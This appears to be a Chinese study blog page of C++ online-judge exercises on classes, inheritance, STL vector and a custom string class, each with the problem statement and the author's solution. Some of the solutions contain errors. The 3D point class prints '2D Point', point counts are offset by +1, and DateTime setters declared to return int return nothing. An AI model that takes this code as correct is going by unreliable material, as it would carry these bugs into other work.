          cout&lt;&lt;&quot;CREATE Date : (&quot;&lt;&lt;year&lt;&lt;&quot;, &quot;&lt;&lt;month&lt;&lt;&quot;, &quot;&lt;&lt;day&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
       &#125;  
       Date &amp;setDate(int a,int b,int c)&#123;year=a;month=b;day=c;return *this;&#125;  
       void showDate() &#123;  
           cout&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;setw(4)&lt;&lt;year&lt;&lt;&quot;-&quot;&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;setw(2)&lt;&lt;month&lt;&lt;&quot;-&quot;&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;setw(2)&lt;&lt;day&lt;&lt;&quot; &quot;;  
       &#125;  
       ~Date()&#123;&#125;  
&#125;;  



class DateTime&#123;  
   private:  
       friend class Date;  
       friend class Time;  
       Time T;  
       Date D;  
       int year1,month1,day1,hh1,mm1,ss1;  
   public:  
       DateTime()&#123;  
         cout&lt;&lt;&quot;CREATE DateTime : (&quot;&lt;&lt;D.year&lt;&lt;&quot;, &quot;&lt;&lt;D.month&lt;&lt;&quot;, &quot;&lt;&lt;D.day&lt;&lt;&quot;, &quot;&lt;&lt;T.hh&lt;&lt;&quot;, &quot;&lt;&lt;T.mm&lt;&lt;&quot;, &quot;&lt;&lt;T.ss&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
       &#125;  
       DateTime(const Date&amp; d,const Time&amp; t):D(d),T(t)&#123;  
         cout&lt;&lt;&quot;CREATE DateTime : (&quot;&lt;&lt;D.year&lt;&lt;&quot;, &quot;&lt;&lt;D.month&lt;&lt;&quot;, &quot;&lt;&lt;D.day&lt;&lt;&quot;) (&quot;&lt;&lt;T.hh&lt;&lt;&quot;, &quot;&lt;&lt;T.mm&lt;&lt;&quot;, &quot;&lt;&lt;T.ss&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
       &#125;  
       DateTime(const DateTime&amp; p):T(p.T),D(p.D)&#123;  
        cout&lt;&lt;&quot;COPY   DateTime : (&quot;&lt;&lt;D.year&lt;&lt;&quot;, &quot;&lt;&lt;D.month&lt;&lt;&quot;, &quot;&lt;&lt;D.day&lt;&lt;&quot;) (&quot;&lt;&lt;T.hh&lt;&lt;&quot;, &quot;&lt;&lt;T.mm&lt;&lt;&quot;, &quot;&lt;&lt;T.ss&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
       &#125;  
       DateTime(int a,int b,int c,int d,int e,int f):D(a,b,c),T(d,e,f)&#123;  
       &#125;  
       int const year(int year1)&#123;D.year=year1;&#125;  
       int const year() const &#123;return D.year;&#125;  
       int const month(int month1)&#123;D.month=month1;&#125;  
       int const month() const&#123;return D.month;&#125;  
       int const day(int day1)&#123;D.day=day1;&#125;  
       int const day() const&#123;return D.day;&#125;  
       int const hour(int hh1)&#123;T.hh=hh1;&#125;  
       int const hour() const&#123;return T.hh;&#125;  
       int const minute(int mm1)&#123;T.mm=mm1;&#125;  
       int const minute() const&#123;return T.mm;&#125;  
       int const second(int ss1)&#123;T.ss=ss1;&#125;  
       int const second() const&#123;return T.ss;&#125;  
       void showDateTime()&#123;  
         D.showDate();  T.showTime();  
       &#125;  
       DateTime &amp;setDateTime(int a,int b,int c,int d,int e,int f)&#123;  
           D.setDate(a,b,c);T.setTime(d,e,f);return *this;  
       &#125;  
       ~DateTime()&#123;&#125;  
&#125;;  

int main()  
&#123;  
    const Date date(1000, 10, 10), dt(date);  
    const Time time(1, 1, 1), tm(time);  
    DateTime date_time(dt, tm);  
    const DateTime cnt(date_time);  
    cout &lt;&lt; &quot;DateTime : &quot; &lt;&lt; cnt.year() &lt;&lt; &quot; &quot; &lt;&lt; cnt.month() &lt;&lt; &quot; &quot; &lt;&lt; cnt.day();  
    cout &lt;&lt; &quot; &quot; &lt;&lt; cnt.hour() &lt;&lt; &quot; &quot; &lt;&lt; cnt.minute() &lt;&lt; &quot; &quot; &lt;&lt; cnt.second();  
    cout &lt;&lt; endl;  
    int cases;  
    cin &gt;&gt; cases;  
    for(int ca = 0; ca &lt; cases; ca++)  
    &#123;  
        int year, month, day;  
        cin &gt;&gt; year &gt;&gt; month &gt;&gt; day;  
        int hour, minute, second;  
        cin &gt;&gt; hour &gt;&gt; minute &gt;&gt; second;  
        date_time.year(year);  
        date_time.month(month);  
        date_time.day(day);  
        date_time.hour(hour);  
        date_time.minute(minute);  
        date_time.second(second);  
        date_time.showDateTime();  
        cout &lt;&lt; endl;  
    &#125;  
&#125;  </code></pre>
<h3 id="38-STL——灵活的线性表"><a href="#38-STL——灵活的线性表" class="headerlink" title="38.STL——灵活的线性表"></a>38.STL——灵活的线性表</h3><blockquote>
<h2 id="Description-37"><a href="#Description-37" class="headerlink" title="Description"></a>Description</h2><p>数组和链表是我们熟知的两种线性结构，但是它们不够灵活（不能同时实现直接插入、删除和访问操作），给你若干种操作，你能通过一种灵活的容器，实现它们的功能吗？</p>
<p>操作1：Build a b （产生一个大小为a的线性表，其值全部赋为b，每组样例仅出现一次，在起始行）</p>
<p>操作2：Modify a b （将线性表的第a个元素的值设为b）</p>
<p>操作3：Insert a b c （在线性表的第a个位置插入第b到第c个位置的所有元素）</p>
<p>操作4：Erase a b（删除线性表第a到第b个位置的所有元素）</p>
<p>操作5：Print a b （输出线性表的第a到第b个元素）</p>
<p>程序在执行操作5的时候要输出结果，格式如“[1]:3 [2]:4 [3]:5”（[]内为线性表的位置，“:”后面为元素的值，不带引号，每组输出占一行）</p>
<h2 id="Input-37"><a href="#Input-37" class="headerlink" title="Input"></a>Input</h2><p>输入有多行，对应5个操作，以EOF结束</p>
<h2 id="Output-37"><a href="#Output-37" class="headerlink" title="Output"></a>Output</h2><p>见Sample</p>
<h2 id="Sample-Input-37"><a href="#Sample-Input-37" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>Build 10 1Modify 2 2Insert 3 1 2Modify 6 4Erase 3 5Print 1 8</p>
<h2 id="Sample-Output-37"><a href="#Sample-Output-37" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>[1]:1 [2]:2 [3]:4 [4]:1 [5]:1 [6]:1 [7]:1 [8]:1</p>
<h2 id="HINT-37"><a href="#HINT-37" class="headerlink" title="HINT"></a>HINT</h2><p><a href="">﻿</a>使用vector可以很容易解决</p>
<h2 id="Append-Code-37"><a href="#Append-Code-37" class="headerlink" title="Append Code"></a>Append Code</h2></blockquote>
<pre><code>#include &lt;iostream&gt;  
#include &lt;vector&gt;  
#include &lt;string&gt;  
using namespace std;  
int main()  
&#123;  
   string l;  
   int a,b,c;  
   vector&lt;int&gt; s;  
   while(cin&gt;&gt;l)&#123;  
    if(l==&quot;Build&quot;)&#123;cin&gt;&gt;a&gt;&gt;b;s.assign(a,b);&#125;  
    else if(l==&quot;Modify&quot;)&#123;cin&gt;&gt;a&gt;&gt;b;s[a-1]=b;&#125;  
    else if(l==&quot;Insert&quot;)&#123;cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;s.insert(s.begin()+a-1,s.begin()+b-1,s.begin()+c);&#125;  
    else if(l==&quot;Erase&quot;)&#123;cin&gt;&gt;a&gt;&gt;b;s.erase(s.begin()+a-1,s.begin()+b);&#125;  
    else if(l==&quot;Print&quot;)&#123;  
        cin&gt;&gt;a&gt;&gt;b;  
        int i;  
        for(i=a-1;i&lt;b;i++)  
        &#123;  
            if(i!=b-1)  
                cout&lt;&lt;&quot;[&quot;&lt;&lt;i+1&lt;&lt;&quot;]&quot;&lt;&lt;&quot;:&quot;&lt;&lt;s[i]&lt;&lt;&quot; &quot;;  
            else  
                cout&lt;&lt;&quot;[&quot;&lt;&lt;i+1&lt;&lt;&quot;]&quot;&lt;&lt;&quot;:&quot;&lt;&lt;s[i]&lt;&lt;endl;  
        &#125;  

    &#125;  
   &#125;  
   return 0;  
&#125;  </code></pre>
<blockquote>
<p>STL中vector容器用法</p>
<p><a href="http://www.cnblogs.com/ziyi--caolu/archive/2013/07/04/3170928.html">http://www.cnblogs.com/ziyi--caolu/archive/2013/07/04/3170928.html</a></p>
<p><a href="http://www.cnblogs.com/zhonghuasong/p/5975979.html">http://www.cnblogs.com/zhonghuasong/p/5975979.html</a></p>
<p><a href="http://blog.csdn.net/xlm289348/article/details/8166820">http://blog.csdn.net/xlm289348/article/details/8166820</a></p>
<p><a href="http://blog.csdn.net/liuweiyuxiang/article/details/52735561">http://blog.csdn.net/liuweiyuxiang/article/details/52735561</a></p>
<blockquote>
<p><strong>3. vector基本操作</strong></p>
<p>(1). 容量</p>
<ul>
<li>向量大小： vec.size();</li>
<li>向量最大容量： vec.max_size();</li>
<li>更改向量大小： vec.resize();</li>
<li>向量真实大小： vec.capacity();</li>
<li>向量判空： vec.empty();</li>
<li>减少向量大小到满足元素所占存储空间的大小： vec.shrink_to_fit(); //<a href="http://www.cplusplus.com/reference/vector/vector/shrink_to_fit/">shrink_to_fit</a></li>
</ul>
<p>(2). 修改</p>
<ul>
<li>多个元素赋值： vec.assign(); //类似于初始化时用数组进行赋值</li>
<li>末尾添加元素： vec.push_back();</li>
<li>末尾删除元素： vec.pop_back();</li>
<li>任意位置插入元素： vec.insert();</li>
<li>任意位置删除元素： vec.erase();</li>
<li>交换两个向量的元素： vec.swap();</li>
<li>清空向量元素： vec.clear();</li>
</ul>
<p>(3)迭代器</p>
<ul>
<li>开始指针：vec.begin();</li>
<li>末尾指针：vec.end(); //指向最后一个元素的下一个位置</li>
<li>指向常量的开始指针： vec.cbegin(); //意思就是不能通过这个指针来修改所指的内容，但还是可以通过其他方式修改的，而且指针也是可以移动的。</li>
<li>指向常量的末尾指针： vec.cend();</li>
</ul>
<p>(4)元素的访问</p>
<ul>
<li>下标访问： vec[1]; //并不会检查是否越界</li>
<li>at方法访问： vec.at(1); //以上两者的区别就是at会检查是否越界，是则抛出out of range异常</li>
<li>访问第一个元素： vec.front();</li>
<li>访问最后一个元素： vec.back();</li>
<li>返回一个指针： int* p = vec.data(); //可行的原因在于vector在内存中就是一个连续存储的数组，所以可以返回一个指针指向这个数组。这是是C++11的特性。</li>
</ul>
</blockquote>
</blockquote>
<h3 id="39-立体空间中的点（I）"><a href="#39-立体空间中的点（I）" class="headerlink" title="39.立体空间中的点（I）"></a>39.立体空间中的点（I）</h3><blockquote>
<h2 id="Description-38"><a href="#Description-38" class="headerlink" title="Description"></a>Description</h2><p>设计一个平面上的点Point类和3维的点Point_3D类，满足Point_3D类继承自Point类，用于读取输入的数据，输出所构造的两种点的坐标。</p>
<p>设计Point类需支持一下操作：</p>
<p>Point::Point()无参构造。</p>
<p>Point::Point(double,double)两个坐标参数构造。</p>
<p>Point::showPoint()按格式输出Point对象</p>
<p>设计Point_3D类需支持一下操作：</p>
<p>Point_3D::Point_3D()无参构造。</p>
<p>Point_3D::Point_3D(double,double,double)三个坐标参数构造。</p>
<p>Point_3D::showPoint()按格式输出Point_3D对象。</p>
<p>-—————————————————————————-</p>
<p>你设计Point类和Point_3D类，使得main()函数能够正确运行。</p>
<p>函数调用格式见append.cc。</p>
<p>append.cc中已给出main()函数。</p>
<h2 id="Input-38"><a href="#Input-38" class="headerlink" title="Input"></a>Input</h2><p>输入的第一个整数n，表示有n组测试数据，后面的输入每行为一组测试数据。每组测试数据的第一行是一个整数m，m有两种取值：2、3；m为2时，后面有两个浮点数x、y，表示一个平面上的点的坐标(x,y)；m为3时后面有3个浮点数x、y、z，表示一个3维的点的坐标(x,y,z)。</p>
<h2 id="Output-38"><a href="#Output-38" class="headerlink" title="Output"></a>Output</h2><p>每组测试数据对应一行输出。</p>
<p>若输入为平面上的点，则输出：“2D Point (x,y)”，x和y为输入的坐标值。</p>
<p>若输入为3维的点，则输出：“3D Point (x,y,y)”，x、y和z为输入的坐标值。</p>
<h2 id="Sample-Input-38"><a href="#Sample-Input-38" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>53 1 2 33 0 0 02 -1 13 -1 -1 -12 0 0</p>
<h2 id="Sample-Output-38"><a href="#Sample-Output-38" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>3D Point (1,2,3)3D Point (0,0,0)2D Point (-1,1)3D Point (-1,-1,-1)2D Point (0,0)</p>
<h2 id="HINT-38"><a href="#HINT-38" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-38"><a href="#Append-Code-38" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1571&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Point&#123;
public:
    double a,b;
    Point()&#123;&#125;
    Point(double aa,double bb):a(aa),b(bb)&#123;&#125;
    void showPoint()&#123;cout &lt;&lt; &quot;2D Point (&quot; &lt;&lt; a &lt;&lt; &quot;,&quot; &lt;&lt; b &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
&#125;;
class Point_3D:public Point&#123;
public:
    double c;
    Point_3D()&#123;&#125;
    Point_3D(double aa,double bb,double cc):Point(aa,bb),c(cc)&#123;&#125;
    void showPoint()&#123;cout &lt;&lt; &quot;2D Point (&quot; &lt;&lt; a &lt;&lt; &quot;,&quot; &lt;&lt; b &lt;&lt; &quot;,&quot; &lt;&lt; c &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
&#125;;
////////////////////
int main()
&#123;
    int cases;
    cin&gt;&gt;cases;
    for(int i = 1; i &lt;= cases; i++)
    &#123;
        double x, y, z;
        int point_type;
        cin&gt;&gt;point_type;
        if(point_type == 2)
        &#123;
            cin&gt;&gt;x&gt;&gt;y;
            Point p(x, y);
            p.showPoint();
        &#125;
        if(point_type == 3)
        &#123;
            cin&gt;&gt;x&gt;&gt;y&gt;&gt;z;
            Point_3D p(x, y, z);
            p.showPoint();
        &#125;
    &#125;
&#125;</code></pre>
<blockquote>
<p>C++继承的概念及语法</p>
<p><a href="http://www.weixueyuan.net/view/6358.html">http://www.weixueyuan.net/view/6358.html</a></p>
</blockquote>
<h3 id="40-立体空间中的点（II）"><a href="#40-立体空间中的点（II）" class="headerlink" title="40.立体空间中的点（II）"></a>40.立体空间中的点（II）</h3><blockquote>
<h2 id="Description-39"><a href="#Description-39" class="headerlink" title="Description"></a>Description</h2><p>设计一个平面上的点Point类和3维的点Point_3D类，满足Point_3D类继承自Point类，用于读取输入的数据，输出所构造的两种点的坐标。并统计输入的两种点的个数。</p>
<p>设计Point类需支持一下操作：</p>
<p>Point::Point()无参构造。</p>
<p>Point::Point(double,double)两个坐标参数构造。</p>
<p>Point::x()返回x坐标</p>
<p>Point::y()返回y坐标</p>
<p>Point::x(int)修改x坐标并返回</p>
<p>Point::y(int)修改y坐标并返回</p>
<p>Point::showPoint()按格式输出Point对象</p>
<p>Point::showNumber()返回Point对象总数的静态函数</p>
<p>设计Point_3D类需支持一下操作：</p>
<p>Point_3D::Point_3D()无参构造。</p>
<p>Point_3D::Point_3D(double,double,double)三个坐标参数构造。</p>
<p>Point_3D::z()返回z坐标。</p>
<p>Point_3D::z(int)修改z坐标并返回。</p>
<p>Point_3D::showPoint()按格式输出Point_3D对象。</p>
<p>Point_3D::setPoint(double,double,double)根据三个坐标参数修改Point_3D对象的坐标。</p>
<p>Point_3D::showNumber()返回Point_3D对象总数的静态函数。</p>
<p>-—————————————————————————-</p>
<p>你设计Point类和Point_3D类，使得main()函数能够正确运行。</p>
<p>函数调用格式见append.cc。</p>
<p>append.cc中已给出main()函数。</p>
<h2 id="Input-39"><a href="#Input-39" class="headerlink" title="Input"></a>Input</h2><p>输入的第一个整数n，表示有n组测试数据，后面的输入每行为一组测试数据。每组测试数据的第一行是一个整数m，m有两种取值：2、3；m为2时，后面有两个浮点数x、y，表示一个平面上的点的坐标(x,y)；m为3时后面有3个浮点数x、y、z，表示一个3维的点的坐标(x,y,z)。</p>
<h2 id="Output-39"><a href="#Output-39" class="headerlink" title="Output"></a>Output</h2><p>开始部分为由main()函数产生的固定输出，用于测试对象的某些方法的调用情况。输出“Test data output :”之后为测试数据对应的输出：</p>
<p>每组测试数据对应一行输出。</p>
<p>若输入为平面上的点，则输出：“2D Point (x,y)”，x和y为输入的坐标值。</p>
<p>若输入为3维的点，则输出：“3D Point (x,y,y)”，x、y和z为输入的坐标值。</p>
<p>最后，分别输出总共输入的平面上的点数和3维的点数。</p>
<h2 id="Sample-Input-39"><a href="#Sample-Input-39" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>53 1 2 33 0 0 02 -1 13 -1 -1 -12 0 0</p>
<h2 id="Sample-Output-39"><a href="#Sample-Output-39" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Invariable test output :3D Point (-100,0,100)Point (0,100,100)Test data output :3D Point (1,2,3)3D Point (0,0,0)2D Point (-1,1)3D Point (-1,-1,-1)2D Point (0,0)Number of 2D Points : 2Number of 3D Points : 3</p>
<h2 id="HINT-39"><a href="#HINT-39" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-39"><a href="#Append-Code-39" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1393&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Point&#123;
public:
    static int num;
    double a,b;
    Point()&#123;&#125;
    Point(double aa,double bb):a(aa),b(bb)&#123;num++;&#125;
    void showPoint()&#123;cout &lt;&lt; &quot;2D Point (&quot; &lt;&lt; a &lt;&lt; &quot;,&quot; &lt;&lt; b &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
    double x()&#123;return a;&#125;
    double y()&#123;return b;&#125;
    double x(double xx)&#123;a=xx;return a;&#125;
    double y(double yy)&#123;b=yy;return b;&#125;
    static int showNumber()&#123;return num+1;&#125;
&#125;;
class Point_3D:public Point&#123;
public:
    static int numm;
    double c;
    Point_3D()&#123;&#125;
    Point_3D(double aa,double bb,double cc):Point(aa,bb),c(cc)&#123;numm++;&#125;
    double z()&#123;return c;&#125;
    double z(double zz)&#123;c=zz;return c;&#125;
    static int showNumber()&#123;return numm+1;&#125;
    void setPoint(double aa,double bb,double cc)&#123;a=aa;b=bb;c=cc;&#125;
    void showPoint()&#123;cout &lt;&lt; &quot;2D Point (&quot; &lt;&lt; a &lt;&lt; &quot;,&quot; &lt;&lt; b &lt;&lt; &quot;,&quot; &lt;&lt; c &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
&#125;;
int Point::num = 0;
int Point_3D::numm = 0;
////////////////////
int main()
&#123;
    cout&lt;&lt;&quot;Invariable test output :&quot;&lt;&lt;endl;
    Point_3D p3d;
    p3d.setPoint(-100, 0, 100);
    p3d.showPoint();
    p3d.x(0);
    p3d.y(100);
    cout&lt;&lt;&quot;Point (&quot;&lt;&lt;p3d.x()&lt;&lt;&quot;,&quot;&lt;&lt;p3d.y()&lt;&lt;&quot;,&quot;&lt;&lt;p3d.z()&lt;&lt;&quot;)&quot;&lt;&lt;endl;
    cout&lt;&lt;&quot;\nTest data output :&quot;&lt;&lt;endl;
    int cases;
    cin&gt;&gt;cases;
    for(int i = 1; i &lt;= cases; i++)
    &#123;
        double x, y, z;
        int point_type;
        cin&gt;&gt;point_type;
        if(point_type == 2)
        &#123;
            cin&gt;&gt;x&gt;&gt;y;
            Point p(x, y);
            p.showPoint();
        &#125;
        if(point_type == 3)
        &#123;
            cin&gt;&gt;x&gt;&gt;y&gt;&gt;z;
            Point_3D p(x, y, z);
            p.showPoint();
        &#125;
    &#125;
    cout&lt;&lt;&quot;Number of 2D Points : &quot;&lt;&lt;Point::showNumber() - Point_3D::showNumber()&lt;&lt;endl;
    cout&lt;&lt;&quot;Number of 3D Points : &quot;&lt;&lt;Point_3D::showNumber() - 1&lt;&lt;endl;
&#125;</code></pre>
<h3 id="41-正方形、长方形、立方体"><a href="#41-正方形、长方形、立方体" class="headerlink" title="41.正方形、长方形、立方体"></a>41.正方形、长方形、立方体</h3><blockquote>
<h2 id="Description-40"><a href="#Description-40" class="headerlink" title="Description"></a>Description</h2><p>给出正方形（Square）、长方形（Rectangle）、立方体（Cuboid）的边长，求周长、面积、体积。</p>
<p>Square类只需存一条边长，构造函数产生一条输出，有边长、周长、面积的函数。</p>
<p>Rectangle类需存长和宽，若从Square类派生而来，因此只需增加一条边，构造函数产生一条输出，有长、宽、周长、面积的函数。</p>
<p>Cuboid类需存长宽高，若从Rectangle类派生而来，因此也只增加一条边，构造函数产生一条输出，有长、宽、高、周长、面积、体积的函数。它的周长定义为所有棱长之和。</p>
<p>-—————————————————————————-</p>
<p>请仔细阅读append.cc代码，并设计好正方形、长方形、立方体派生关系，使main()函数能够运行并得到正确的输出。</p>
<h2 id="Input-40"><a href="#Input-40" class="headerlink" title="Input"></a>Input</h2><p>输入分为三部分，每一部分都已一个整数n开始，表示后面有n组测试数据。</p>
<p>在第一部分测试数据中，每组是一个整数，表示正方形的边长。</p>
<p>在第二部分测试数据中，每组是两个整数，表示长方形的长和宽。</p>
<p>在第三部分测试数据中，每组是三个整数， 表示立方体的长和宽。</p>
<h2 id="Output-40"><a href="#Output-40" class="headerlink" title="Output"></a>Output</h2><p>每组测试数据对应的输出为两部分，前面是构造函数的输出，最后是输出图形的信息，包括长宽高、周长、面积、体积等信息，格式见sample；</p>
<h2 id="Sample-Input-40"><a href="#Sample-Input-40" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>1413 413 4 6</p>
<h2 id="Sample-Output-40"><a href="#Sample-Output-40" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Construct Square (4)A Square length 4, Perimeter 16, Area 16=========================Construct Square (3)Construct Rectangle (3, 4)A Rectangle length 3, width 4, Perimeter 14, Area 12=========================Construct Square (3)Construct Rectangle (3, 4)Construct Cuboid (3, 4, 6)A Cuboid length 3, width 4, height 6, Perimeter 52, Area 108, Volume 72</p>
<h2 id="HINT-40"><a href="#HINT-40" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-40"><a href="#Append-Code-40" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=0&pid=1678&getkey=">append.c</a>, <a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1678&getkey=">append.cc</a>,     </p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
using namespace std;
class Square&#123;
public:
    int a;
    Square()&#123;&#125;
    Square(int aa):a(aa)&#123;cout &lt;&lt; &quot;Construct Square (&quot; &lt;&lt; a &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
    int length()&#123;return a;&#125;
    int perimeter()&#123;return 4*a;&#125;
    int area()&#123;return a*a;&#125;
&#125;;
class Rectangle:public Square&#123;
public:
    int b;
    Rectangle()&#123;&#125;
    Rectangle(int aa,int bb):Square(aa),b(bb)&#123;cout &lt;&lt; &quot;Construct Rectangle (&quot; &lt;&lt; a &lt;&lt; &quot;,&quot; &lt;&lt; b &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
    int length()&#123;return a;&#125;
    int width()&#123;return b;&#125;
    int perimeter()&#123;return 2*(a+b);&#125;
    int area()&#123;return a*b;&#125;
&#125;;
class Cuboid:public Rectangle&#123;
public:
    int c;
    Cuboid()&#123;&#125;
    Cuboid(int aa,int bb,int cc):Rectangle(aa,bb),c(cc)&#123;cout &lt;&lt; &quot;Construct Cuboid (&quot; &lt;&lt; a &lt;&lt; &quot;,&quot; &lt;&lt; b &lt;&lt; &quot;,&quot; &lt;&lt; c &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
    int length()&#123;return a;&#125;
    int width()&#123;return b;&#125;
    int height()&#123;return c;&#125;
    int perimeter()&#123;return 4*(a+b+c);&#125;
    int area()&#123;return 2*(a*b+a*c+b*c);&#125;
    int volume()&#123;return a*b*c;&#125;
&#125;;
////////////////////////
int main()
&#123;
    int cases, l, w, h;
    cin &gt;&gt; cases;
    for(int i = 1; i &lt;= cases; ++i)
    &#123;
        cin &gt;&gt; l;
        Square squa(l);
        cout &lt;&lt; &quot;A Square length &quot; &lt;&lt; squa.length() &lt;&lt; &quot;, &quot;;
        cout &lt;&lt; &quot;Perimeter &quot; &lt;&lt; squa.perimeter() &lt;&lt; &quot;, &quot;;
        cout &lt;&lt; &quot;Area &quot; &lt;&lt; squa.area() &lt;&lt; endl;
    &#125;

    cout &lt;&lt; &quot;=========================&quot; &lt;&lt; endl;

    cin &gt;&gt; cases;
    for(int i = 1; i &lt;= cases; ++i)
    &#123;
        cin &gt;&gt; l &gt;&gt; w;
        Rectangle rect(l, w);
        cout &lt;&lt; &quot;A Rectangle length &quot; &lt;&lt; rect.length() &lt;&lt; &quot;, width &quot; &lt;&lt; rect.width() &lt;&lt; &quot;, &quot;;
        cout &lt;&lt; &quot;Perimeter &quot; &lt;&lt; rect.perimeter() &lt;&lt; &quot;, &quot;;
        cout &lt;&lt; &quot;Area &quot; &lt;&lt; rect.area() &lt;&lt; endl;
    &#125;

    cout &lt;&lt; &quot;=========================&quot; &lt;&lt; endl;

    cin &gt;&gt; cases;
    for(int i = 1; i &lt;= cases; ++i)
    &#123;
        cin &gt;&gt; l &gt;&gt; w &gt;&gt; h;
        Cuboid cubo(l, w, h);
        cout &lt;&lt; &quot;A Cuboid length &quot; &lt;&lt; cubo.length() &lt;&lt; &quot;, width &quot; &lt;&lt; cubo.width() &lt;&lt; &quot;, height &quot; &lt;&lt; cubo.height() &lt;&lt; &quot;, &quot;;
        cout &lt;&lt; &quot;Perimeter &quot; &lt;&lt; cubo.perimeter() &lt;&lt; &quot;, &quot;;
        cout &lt;&lt; &quot;Area &quot; &lt;&lt; cubo.area() &lt;&lt; &quot;, &quot;;
        cout &lt;&lt; &quot;Volume &quot; &lt;&lt; cubo.volume() &lt;&lt; endl;
    &#125;

&#125;
</code></pre>
<h3 id="42-字符串类（I）"><a href="#42-字符串类（I）" class="headerlink" title="42.字符串类（I）*"></a>42.字符串类（I）*</h3><blockquote>
<h2 id="Description-41"><a href="#Description-41" class="headerlink" title="Description"></a>Description</h2><p>封装一个字符串类，用于存储字符串和处理的相关功能，支持以下操作：</p>
<p>\1. STR::STR()构造方法：创建一个空的字符串对象。</p>
<p>\2. STR::STR(const char *)构造方法：创建一个字符串对象，串的内容由参数给出。</p>
<p>\3. STR::length()方法：返回字符串的长度。</p>
<p>\4. STR::putline()方法：输出串的内容，并换行。</p>
<p>-—————————————————————————-</p>
<p>你设计一个字符串类STR，使得main()函数能够正确运行。</p>
<p>函数调用格式见append.cc。</p>
<p>append.cc中已给出main()函数。</p>
<p>-—————————————————————————-</p>
<p>Invalid Word（禁用单词）错误：“string”、“vector”等被禁用。</p>
<h2 id="Input-41"><a href="#Input-41" class="headerlink" title="Input"></a>Input</h2><p>输入有若干行，每行一个字符串。</p>
<h2 id="Output-41"><a href="#Output-41" class="headerlink" title="Output"></a>Output</h2><p>每组测试数据对应输出一行，包含两部分内容，首先是一个整数，表示输入串的长度，然后是输入的字符串，两者用一个空格分开。格式见sample。</p>
<h2 id="Sample-Input-41"><a href="#Sample-Input-41" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>A123456789</p>
<h2 id="Sample-Output-41"><a href="#Sample-Output-41" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>0 12 Hello World!1 A9 123456789</p>
<h2 id="HINT-41"><a href="#HINT-41" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-41"><a href="#Append-Code-41" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1578&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>
#include &lt;iostream&gt;
#include &lt;stdio.h&gt;
using namespace std;
int len(char * s)
&#123;
    int i = 0; int len_ = 0;
    while(s[i] != &#39;\0&#39; ) &#123; len_++; i++; &#125;
    return len_;
&#125;
void strcpy_(char *s, char *t)
&#123;
    int i  = 0;
    while(t[i] != &#39;\0&#39;) &#123; s[i] = t[i]; i++; &#125;
    s[i] = &#39;\0&#39;;
&#125;
class STR
&#123;
public:
    int length() const &#123; return len(stl); &#125;
    void putline() const &#123;  cout &lt;&lt; stl &lt;&lt; endl; &#125;
public:
    STR(char *s = NULL )
    &#123;
        if(s == NULL)
        &#123;
            stl = new char[1];
            stl[0] = &#39;\0&#39;;
        &#125;
        else
        &#123;
            stl = new char[len(s) + 1];
            strcpy_(stl,s);
        &#125;
    &#125;
private:
    char *stl;
&#125;;
int main()
&#123;
    STR e;
    STR h(&quot;Hello World!&quot;);
    char s[100001];
    cout &lt;&lt; e.length() &lt;&lt; &quot; &quot;;
    e.putline();
    cout &lt;&lt; h.length() &lt;&lt; &quot; &quot;;
    h.putline();
    while(gets(s) != NULL)
    &#123;
        STR str(s);
        cout &lt;&lt; str.length() &lt;&lt; &quot; &quot;;
        str.putline();
    &#125;
&#125;</code></pre>
<h3 id="43-字符串类（II）"><a href="#43-字符串类（II）" class="headerlink" title="43.字符串类（II）"></a>43.字符串类（II）</h3><blockquote>
<h2 id="Description-42"><a href="#Description-42" class="headerlink" title="Description"></a>Description</h2><p>封装一个字符串类，用于存储字符串和处理的相关功能，支持以下操作：</p>
<p>\1. STR::STR()构造方法：创建一个空的字符串对象。</p>
<p>\2. STR::STR(const char *)构造方法：创建一个字符串对象，串的内容由参数给出。</p>
<p>\3. STR::length()方法：返回字符串的长度。</p>
<p>\4. STR::putline()方法：输出串的内容，并换行。</p>
<p>\5. 运算符“+”和“+=”，表示两个字符串的连接运算，规则为：</p>
<p>   c = a + b 表示串c中的字符是a和b的连接：“a+b”的结果是一个新的字符串，串a和串b的内容不变。</p>
